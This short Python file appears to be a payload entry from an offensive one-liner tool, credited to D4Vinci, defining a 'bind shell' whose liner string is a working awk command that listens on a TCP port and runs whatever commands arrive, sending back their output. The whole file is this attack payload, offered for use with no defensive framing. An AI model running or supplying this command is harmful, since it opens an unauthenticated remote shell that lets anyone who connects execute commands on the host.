class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple bind shell using awk."
    function    = "bind shell"
    liner       = """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'"""
